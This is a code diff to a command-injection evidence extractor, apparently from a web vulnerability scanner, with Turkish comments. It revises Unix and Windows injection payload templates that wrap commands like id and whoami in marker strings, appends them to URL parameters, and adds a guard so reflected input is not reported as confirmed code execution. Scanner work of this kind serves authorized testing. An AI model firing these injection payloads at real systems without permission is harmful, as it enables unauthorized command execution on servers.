@@ -284,13 +284,19 @@ class CMDiEvidenceExtractor:
         ("ipconfig",            "win_ipconfig"),
     ]
 
-    _INJECT_FMTS: List[str] = [
-        "; echo {s}$({cmd}){e}",        # unix subshell
-        "; echo {s}$(\\{cmd}){e}",      # escaped subshell
-        "| echo {s}$({cmd}){e}",        # pipe subshell
-        "; printf '{s}'; {cmd}; printf '{e}'",  # printf sandwich
-        "%0a echo {s}$({cmd}){e}",      # newline
-        "& echo {s}{cmd}{e}",           # windows — cmd placeholder, not used
+    # (format, os) — os, biçimi eşleşen komut kümesiyle eşler: unix komutlarına
+    # yalnız unix shell sözdizimi, win komutlarına yalnız cmd sözdizimi uygulanır.
+    _INJECT_FMTS: List[Tuple[str, str]] = [
+        ("; echo {s}$({cmd}){e}",       "unix"),  # unix subshell
+        ("; echo {s}$(\\{cmd}){e}",     "unix"),  # escaped subshell
+        ("| echo {s}$({cmd}){e}",       "unix"),  # pipe subshell
+        ("; printf '{s}'; {cmd}; printf '{e}'", "unix"),  # printf sandwich
+        ("%0a echo {s}$({cmd}){e}",     "unix"),  # newline
+        # faz8: önceki "& echo {s}{cmd}{e}" subshell'siz LİTERAL komut adını
+        # echo'luyordu (çıktı değil) → ne Windows RCE'yi onaylar ne de execution'ı
+        # reflection'dan ayırırdı (sahte "RCE Confirmed Critical" riski). Gerçek
+        # çıktı yakalayan cmd-zincirine çevrildi: echo MARK, komutu çalıştır, echo MARK.
+        ("& echo {s}& {cmd} & echo {e}", "win"),  # windows cmd output-capture
     ]
 
     def extract(
@@ -318,11 +324,9 @@ class CMDiEvidenceExtractor:
         qs = parse_qsl(parsed.query)
 
         for cmd, technique in self._UNIX_CMDS + self._WIN_CMDS:
-            for fmt in self._INJECT_FMTS:
-                # Windows cmd placeholder → yalnız win_ için dene
-                if "{cmd}" in fmt and "win_" in technique and "$()" in fmt:
-                    continue
-                if "win_" in technique and "printf" in fmt:
+            cmd_os = "win" if "win_" in technique else "unix"
+            for fmt, fmt_os in self._INJECT_FMTS:
+                if fmt_os != cmd_os:
                     continue
                 payload = fmt.format(s=CMD_MARK_S, cmd=cmd, e=CMD_MARK_E)
                 new_qs = [(p, v + payload if p == param else v) for p, v in qs]
@@ -331,19 +335,37 @@ class CMDiEvidenceExtractor:
                     resp = session.get(test_url, timeout=timeout)
                     text = resp.text or ""
                     raw = extract_cmd_marked(text)
-                    if raw and raw not in baseline_text:
+                    raw = raw.strip() if raw else ""
+                    # FP-guard (faz8): markerlar arası içerik gerçek komut ÇIKTISI mı,
+                    # yoksa payload'ın reflection'ı mı? Param input'u aynen geri yansıtırsa
+                    # markerlar GERÇEK ÇIKTIYI değil enjekte ettiğimiz shell sözdizimini
+                    # ($(id), '; id; printf ', & whoami & echo …) sarar. Gerçek id/whoami/
+                    # uname/passwd çıktısı bu enjeksiyon token'larını İÇERMEZ → reflection'ı
+                    # token varlığıyla ele; aksi halde reflection sahte "RCE Confirmed" üretirdi.
+                    _is_reflection = (
+                        not raw
+                        or raw == cmd
+                        or raw.startswith(("&", "|", ";"))   # cmd-separator (win echo-zinciri vb.)
+                        or "$(" in raw                        # subshell reflection
+                        or "printf" in raw                    # printf-sandwich reflection
+                    )
+                    if raw and not _is_reflection and raw not in baseline_text:
                         result: Dict[str, Any] = {
                             "command":   cmd,
                             "raw_output": raw[:500],
                             "technique": technique,
                             "payload":   payload,
                         }
-                        # Unix id çıktısını parse et
-                        uid_m = re.search(r"uid=(\d+)\((\w+)\)", raw)
+                        # Unix id çıktısını parse et.
+                        # faz8 fix: kullanıcı adı `(\w+)` ile aranıyordu ama `\w` tireyi
+                        # KAPSAMAZ → "www-data" (en yaygın web-server kullanıcısı),
+                        # "systemd-network" gibi tireli adlar parse EDİLEMİYOR, uid/username
+                        # sessizce boş kalıyordu (groups regex'i zaten `[\w-]` kullanıyor).
+                        uid_m = re.search(r"uid=(\d+)\(([\w-]+)\)", raw)
                         if uid_m:
                             result["uid"]      = uid_m.group(1)
                             result["username"] = uid_m.group(2)
-                        gid_m = re.search(r"gid=(\d+)\((\w+)\)", raw)
+                        gid_m = re.search(r"gid=(\d+)\(([\w-]+)\)", raw)
                         if gid_m:
                             result["gid"]       = gid_m.group(1)
                             result["gid_name"]  = gid_m.group(2)
